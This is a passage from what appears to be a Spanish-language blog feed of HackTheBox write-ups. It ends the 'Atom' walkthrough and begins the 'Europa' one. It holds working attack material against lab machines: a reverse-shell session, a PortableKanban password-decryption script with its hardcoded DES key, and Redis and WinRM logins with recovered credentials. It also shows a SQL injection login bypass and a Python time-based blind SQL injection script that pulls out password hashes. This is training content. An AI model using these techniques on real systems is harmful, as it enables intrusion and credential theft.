&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.237.
Connection from 10.10.10.237:54130.
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

whoami
whoami
atom\jason
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora podemos dirigirnos a su directorio personal y leer la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd C:\Users\jason\Desktop

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\Users\jason\Desktop

04/02/2021  10:29 PM    &amp;lt;DIR&amp;gt;          .
04/02/2021  10:29 PM    &amp;lt;DIR&amp;gt;          ..
03/31/2021  02:09 AM             2,353 heedv1.lnk
03/31/2021  02:09 AM             2,353 heedv2.lnk
03/31/2021  02:09 AM             2,353 heedv3.lnk
08/10/2023  05:27 PM                34 user.txt
               4 File(s)          7,093 bytes
               2 Dir(s)   5,622,317,056 bytes free

type user.txt
type user.txt
5dcbc34fb2b0acaf6f9262acb7ec960e
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;elevacion-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#elevacion-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si enumeramos un poco el sistema, vemos en la carpeta Download un directorio referente a &lt;code&gt;PortableKanban&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd Downloads

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\Users\jason\Downloads

04/02/2021  08:00 AM    &amp;lt;DIR&amp;gt;          .
04/02/2021  08:00 AM    &amp;lt;DIR&amp;gt;          ..
03/31/2021  02:36 AM    &amp;lt;DIR&amp;gt;          node_modules
04/02/2021  08:21 PM    &amp;lt;DIR&amp;gt;          PortableKanban
               0 File(s)              0 bytes
               4 Dir(s)   5,622,136,832 bytes free

C:\Users\jason\Downloads&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si listamos el contenido obervamos varios archivos &lt;code&gt;dll&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd PortableKanban

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\Users\jason\Downloads\PortableKanban

04/02/2021  08:21 PM    &amp;lt;DIR&amp;gt;          .
04/02/2021  08:21 PM    &amp;lt;DIR&amp;gt;          ..
02/27/2013  08:06 AM            58,368 CommandLine.dll
11/08/2017  01:52 PM           141,312 CsvHelper.dll
06/22/2016  09:31 PM           456,704 DotNetZip.dll
04/02/2021  07:44 AM    &amp;lt;DIR&amp;gt;          Files
11/23/2017  04:29 PM            23,040 Itenso.Rtf.Converter.Html.dll
11/23/2017  04:29 PM            75,776 Itenso.Rtf.Interpreter.dll
11/23/2017  04:29 PM            32,768 Itenso.Rtf.Parser.dll
11/23/2017  04:29 PM            19,968 Itenso.Sys.dll
11/23/2017  04:29 PM           376,832 MsgReader.dll
07/03/2014  10:20 PM           133,296 Ookii.Dialogs.dll
04/02/2021  07:17 AM    &amp;lt;DIR&amp;gt;          Plugins
04/02/2021  08:22 PM             5,920 PortableKanban.cfg
01/04/2018  09:12 PM           118,184 PortableKanban.Data.dll
01/04/2018  09:12 PM         1,878,440 PortableKanban.exe
01/04/2018  09:12 PM            31,144 PortableKanban.Extensions.dll
04/02/2021  07:21 AM               172 PortableKanban.pk3.lock
09/06/2017  12:18 PM           413,184 ServiceStack.Common.dll
09/06/2017  12:17 PM           137,216 ServiceStack.Interfaces.dll
09/06/2017  12:02 PM           292,352 ServiceStack.Redis.dll
09/06/2017  04:38 AM           411,648 ServiceStack.Text.dll
01/04/2018  09:14 PM         1,050,092 User Guide.pdf
              19 File(s)      5,656,416 bytes
               4 Dir(s)   5,625,991,168 bytes free
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si tratamos de buscar vulnerabilidades asociadas a &lt;code&gt;PortableKanban&lt;/code&gt;, vemos un exploit con el podemos desencriptar una contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit portablekanban
------------------------------------------------------- ---------------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- ---------------------------------
PortableKanban 4.3.6578.38136 - Encrypted Password Ret | windows/local/49409.py
------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vimos anteriormente cuando listamos los archivos de &lt;code&gt;portablekanban&lt;/code&gt; un archivo de configuración &lt;code&gt;PortableKanban.cfg&lt;/code&gt; que si lo leemos encontramos una contraseña encryptada.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;type PortableKanban.cfg
{&quot;RoamingSettings&quot;:{&quot;DataSource&quot;:&quot;RedisServer&quot;,&quot;DbServer&quot;:&quot;localhost&quot;,&quot;DbPort&quot;:6379,&quot;DbEncPassword&quot;:&quot;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb&quot;,&quot;DbServer2&quot;:&quot;&quot;,&quot;DbPort2&quot;:6379,&quot;DbEncPassword2&quot;:&quot;&quot;,&quot;DbIndex&quot;:0,&quot;DbSsl&quot;:false,&quot;DbTimeout&quot;:10,&quot;FlushChanges&quot;:true,&quot;UpdateInterval&quot;:5,&quot;AutoUpdate&quot;:true,&quot;Caption&quot;:&quot;My Tasks&quot;,&quot;RightClickAction&quot;:&quot;Nothing&quot;,&quot;DateTimeFormat&quot;:&quot;ddd, M/d/yyyy h:mm tt&quot;,&quot;BoardForeColor&quot;:&quot;WhiteSmoke&quot;,&quot;BoardBackColor&quot;:&quot;DimGray&quot;,&quot;ViewTabsFont&quot;:&quot;Segoe UI, 9pt&quot;,&quot;SelectedViewTabForeColor&quot;:&quot;WhiteSmoke&quot;,&quot;SelectedViewTabBackColor&quot;:&quot;Black&quot;,&quot;HeaderFont&quot;:&quot;Segoe UI, 11.4pt&quot;,&quot;HeaderShowCount&quot;:true,&quot;HeaderShowLimit&quot;:true,&quot;HeaderShowEstimates&quot;:true,&quot;HeaderShowPoints&quot;:false,&quot;HeaderForeColor&quot;:&quot;WhiteSmoke&quot;,&quot;HeaderBackColor&quot;:&quot;Gray&quot;,&quot;CardFont&quot;:&quot;Segoe UI, 11.4pt&quot;,&quot;CardLines&quot;:3,&quot;CardTextAlignment&quot;:&quot;Center&quot;,&quot;CardShowMarks&quot;:true,&quot;CardShowInitials&quot;:false,&quot;CardShowTags&quot;:true,&quot;ThickTags&quot;:false,&quot;DefaultTaskForeColor&quot;:&quot;WhiteSmoke&quot;,&quot;DefaultTaskBackColor&quot;:&quot;Gray&quot;,&quot;SelectedTaskForeColor&quot;:
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Recordemos que los archivos de configuración muchas veces contienen contraseñas ya sean encriptadas o en texto claro.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Como ya contamos con una contraseña, ahora vamos a modificar un poco el exploit de tal manera que nos muestre la contraseña en texto claro.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import json
import base64
from des import * #python3 -m pip install des
import sys

hash = 'Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb'

hash = base64.b64decode(hash.encode('utf-8'))
key = DesKey(b&quot;7ly6UznJ&quot;)
print(key.decrypt(hash,initial=b&quot;XuVUm5fR&quot;,padding=True).decode('utf-8'))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el exploit y obtenemos la contraseña en texto claro.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 portable.py
kidvscat_yes_kidvscat
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos tratar de conectarnos como el usuario administrador con la contraseña obtenida, pero no resulta ser la correcta. Pero otro punto a recalcar es que en el archivo de configuración vemos algo de &lt;code&gt;RedisServer&lt;/code&gt;, asi que podemos tratar de conectarnos al servicio de &lt;code&gt;redis&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ redis-cli -h 10.10.10.237
10.10.10.237:6379&amp;gt; auth kidvscat_yes_kidvscat
OK
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para poder enumerar el servicio podemos apoyarnos de &lt;code&gt;hacktricks&lt;/code&gt;, te dejo el recurso aqui:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis&quot;&gt;https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Podemos listar las KEYS disponibles y listar&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;10.10.10.237:6379&amp;gt; KEYS *
1) &quot;pk:ids:User&quot;
2) &quot;pk:ids:MetaDataClass&quot;
3) &quot;pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0&quot;
4) &quot;pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff&quot;
10.10.10.237:6379&amp;gt; GET pk:ids:User
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.10.10.237:6379&amp;gt; GET pk:ids:MetaDataClass
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.10.10.237:6379&amp;gt; GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
&quot;{\&quot;Id\&quot;:\&quot;e8e29158d70d44b1a1ba4949d52790a0\&quot;,\&quot;Name\&quot;:\&quot;Administrator\&quot;,\&quot;Initials\&quot;:\&quot;\&quot;,\&quot;Email\&quot;:\&quot;\&quot;,\&quot;EncryptedPassword\&quot;:\&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\&quot;,\&quot;Role\&quot;:\&quot;Admin\&quot;,\&quot;Inactive\&quot;:false,\&quot;TimeStamp\&quot;:637530169606440253}&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Obtenemos una contraseña enctryptada &lt;code&gt;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&lt;/code&gt; con el mismo formato que la anterior que encontramos, asi que podemos usar el mismo exploit que previamente usamos para decencriptarla.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import json
import base64
from des import * #python3 -m pip install des
import sys

hash = 'Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'

hash = base64.b64decode(hash.encode('utf-8'))
key = DesKey(b&quot;7ly6UznJ&quot;)
print(key.decrypt(hash,initial=b&quot;XuVUm5fR&quot;,padding=True).decode('utf-8'))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejectamos nuevamente el exploit y obtenemos una nueva contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 portable.py
kidvscat_admin_@123
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos a intentar con esta nueva conectarnos como el usuario &lt;code&gt;Administrator&lt;/code&gt; usando &lt;code&gt;winrm&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.10.237 -u 'Administrator' -p 'kidvscat_admin_@123'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; whoami
atom\administrator
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos conectamos satisfactoriamente y ahora podemos dirigirnos al directorio personal del usuario &lt;code&gt;Administrator&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         8/10/2023   5:27 PM             34 root.txt


Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt
f55c47e3b749e8ae956f980fba1dc782
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Thu, 10 Aug 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Atom</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Atom</guid>
        
        <category>SMB Enumeration</category>
        
        <category>Abusing electron updater</category>
        
        <category>Signature Validation Bypass RCE</category>
        
        <category>Abusing PortableKanban</category>
        
        <category>Redis Enumeration</category>
        
        <category>Abusing WinRM</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Europa - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Europa&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad media, en esta ocasión comprometeremos el sistema a traves de una inyección sql a un panel de login de un dominio expuesto en los &lt;code&gt;CommonNames&lt;/code&gt;, ademas adicionalmente explotaremos una &lt;code&gt;blind sql&lt;/code&gt; haciendo scripting en &lt;code&gt;python&lt;/code&gt;. Una vez ya en el dashboard nos aprovecharemos de una vulnerabilidad de &lt;code&gt;regex&lt;/code&gt; que nos permitira visualizar la primera flag del sistema y finalmente para convertirnos en el usuario &lt;code&gt;root&lt;/code&gt; nos aprovecharemos de una tarea &lt;code&gt;cron&lt;/code&gt; en la que manipularemos el permiso de la &lt;code&gt;bash&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Maquina curiosa asi que vamos a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Europa
❯ ls

 Europa
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.22
PING 10.10.10.22 (10.10.10.22) 56(84) bytes of data.
64 bytes from 10.10.10.22: icmp_seq=1 ttl=63 time=132 ms

--- 10.10.10.22 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 131.781/131.781/131.781/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.22 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-07 01:20 GMT
Initiating SYN Stealth Scan at 01:20
Scanning 10.10.10.22 [65535 ports]
Discovered open port 22/tcp on 10.10.10.22
Discovered open port 443/tcp on 10.10.10.22
Discovered open port 80/tcp on 10.10.10.22
Completed SYN Stealth Scan at 01:20, 26.93s elapsed (65535 total ports)
Nmap scan report for 10.10.10.22
Host is up, received user-set (0.15s latency).
Scanned at 2023-08-07 01:20:05 GMT for 26s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.06 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 25 (1.100KB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80,443 10.10.10.22 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-07 01:22 GMT
Nmap scan report for 10.10.10.22
Host is up (0.24s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.12 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.2p2 Ubuntu 4ubuntu2.2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.18&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;443&lt;/td&gt;
      &lt;td&gt;HTTPS&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.18&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotacion&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzamos usando &lt;code&gt;whatweb&lt;/code&gt;, para determinar las tecnologias que esta usando el servicio web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.22
http://10.10.10.22 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], PoweredBy[{], Script[text/javascript], Title[Apache2 Ubuntu Default Page: It works]
❯ whatweb https://10.10.10.22
https://10.10.10.22 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], PoweredBy[{], Script[text/javascript], Title[Apache2 Ubuntu Default Page: It works]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta no nos reporta mucha información, pero si vemos anteriormente &lt;code&gt;nmap&lt;/code&gt; nos reporto &lt;code&gt;CommonNames&lt;/code&gt; en el puerto 443, referentes a &lt;code&gt;europacorp.htb&lt;/code&gt;. Asi que vamos a proceder a añadirlos a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.22 europacorp.htb admin-portal.europacorp.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora vemos el servicio correspondiente al dominio &lt;code&gt;admin-portal.europacorp.htb&lt;/code&gt; en el navegador, nos redirige a un panel de login.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Usaremos &lt;code&gt;burpsuite&lt;/code&gt; para intentar manipular la petición e intentar colar una inyección.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Probamos a tratar de realizar una inyección sql, aplicando un &lt;code&gt;order by&lt;/code&gt; basandonos en la quinta columna, obtenemos un codigo de estado &lt;code&gt;302&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si aplicamos un &lt;code&gt;follow redirect&lt;/code&gt;, vemos que nos logea al panel administrativo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podriamos seguir resolviendo la maquina, pero si ahora queremos realizar una enumeración de la base de datos para obtener mayor información podemos aprovecharnos de una de las columnas, y intentariamos obtener el nombre por ejemplo de la base de datos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero vemos que no podemos ver el &lt;code&gt;output&lt;/code&gt; de la inyección; por lo tanto ya que estamos a ciegas tendriamos que realizar una inyección basada en tiempo.&lt;/p&gt;

&lt;p&gt;Ojo esto es opcional, ya que podriamos continuar con el desarrollo de la máquina normalmente.&lt;/p&gt;

&lt;p&gt;Continuando para seguir con la explotación de la &lt;code&gt;sql time based&lt;/code&gt;, vamos a mandar una query en especifico que sera la siguente, donde aplicaremos una condición que al ser el primer caracter del nombre de la base de datos una &lt;code&gt;a&lt;/code&gt; la petición tardara 5 segundos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Se valida la inyección correctamente asi que podemos tratar de automatizar el proceso montandonos un script en python y de esta manera obtendriamos la contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3

from pwn import *
import string
import urllib3
import sys, pdb, signal, time, requests


def def_handler(sig, frame):
    print(&quot;\n[!] Saliendo...!\n&quot;)
    sys.exit(1)

#ctrl_c
signal.signal(signal.SIGINT, def_handler)

#globlal vars
main_url = &quot;https://admin-portal.europacorp.htb/login.php&quot;
characters = string.digits + 'abcdef'
urllib3.disable_warnings()

def makeRequest():
    s = requests.session()
    s.verify = False
    
    p1 = log.progress(&quot;Fuerza Bruta&quot;)

    p1.status(&quot;Iniciando proceso de Fuerza Bruta&quot;)

    time.sleep(2)
    
    p2 = log.progress(&quot;Database&quot;)

    data = &quot;&quot;
    for position in range(1, 50):
        for character in characters:

            post_data = {
                    'email':&quot;admin@europacorp.htb' and if(substr((select group_concat(password) from users),%d,1)='%s',sleep(3),1)-- -&quot; % (position, character),
                    'password':'admin'
            }

            p1.status(post_data['email'])
            time_start = time.time()
            r = s.post(main_url, data=post_data)
            time_end = time.time()

            if time_end - time_start &amp;gt; 3:
                data += character
                p2.status(data)
                break
if __name__ == '__main__':
    makeRequest()

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos un contraseña hasheada la cual intentaremos crackear.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;2b6d315337f18617ba18922c0b9597ff
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;si lo crackeamos online obtenemos la siguiente contraseña &lt;code&gt;SuperSecretPassword!&lt;/code&gt;, la cual es valida para el usuario &lt;code&gt;admin&lt;/code&gt; y nos permite igualmente poder logearnos al sistema.&lt;/p&gt;

&lt;p&gt;Una vez dentro del dashboard vemos la opción de &lt;code&gt;Tools&lt;/code&gt;, donde podemos ver un generador de VPN que vamos a interceptar tambien con &lt;code&gt;burpsuite&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Urldecodeamos la petición y para ver en texto claro como se envia la petición, ahi observamos que se aplica un patron en &lt;code&gt;pattern&lt;/code&gt; a traves de expresiones regulares.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Probamos a validar con una expresión comun de regex y efectivamente se aplica mediante el patron.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora investigamos un poco existe una vulnerabilidad de la cual nos podemos aprovechar a traves de la &lt;code&gt;regex&lt;/code&gt;, te dejo aqui un articulo para que lo revises a mayor detalle:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace&quot;&gt;https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

